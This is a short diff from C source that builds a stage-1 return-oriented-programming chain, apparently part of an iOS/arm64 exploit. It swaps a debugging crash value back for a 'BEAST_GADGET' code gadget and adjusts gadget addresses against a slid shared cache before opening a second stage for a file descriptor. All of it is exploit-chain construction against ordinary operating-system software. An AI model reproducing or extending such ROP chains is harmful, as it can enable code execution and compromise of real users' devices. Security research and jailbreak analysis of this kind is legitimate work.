@@ -251,8 +251,7 @@ void generate_stage1_rop_chain(offset_struct_t * offsets) {
 	ADD_STATIC_GADGET(0);								   // 0x110		[3] x20 [4] x5/sixth arg
 	ADD_GADGET();										   // 0x118		[3] x19 [4] x7/eighth arg
 	ADD_GADGET();										   // 0x120		[3] x29
-	//ADD_CODE_GADGET(offsets->BEAST_GADGET);				   // 0x128		[3] x30 (next gadget)
-	ADD_STATIC_GADGET(0x657461766972702f); // crash here to get fd?
+	ADD_CODE_GADGET(offsets->BEAST_GADGET);				   // 0x128		[3] x30 (next gadget)
 	
 #define ADD_UNSLID_CODE_GADGET(code_addr) ADD_STATIC_GADGET(code_addr-0x180000000+offsets->new_cache_addr)
 	// we can now use the stack cache for the other calls and now we will open stage 2 to get a file descriptor
